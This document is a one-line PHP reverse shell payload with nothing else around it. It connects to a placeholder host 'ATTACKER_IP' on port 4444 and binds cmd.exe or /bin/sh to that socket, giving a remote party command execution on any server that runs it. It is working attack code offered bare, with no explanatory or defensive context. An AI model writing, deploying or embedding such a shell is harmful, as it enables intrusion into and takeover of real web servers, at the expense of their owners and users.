<?php $s=fsockopen('ATTACKER_IP',4444);proc_open((stripos(PHP_OS,'WIN')?'cmd.exe':'/bin/sh'),[0=>$s,1=>$s,2=>$s],$p); ?>
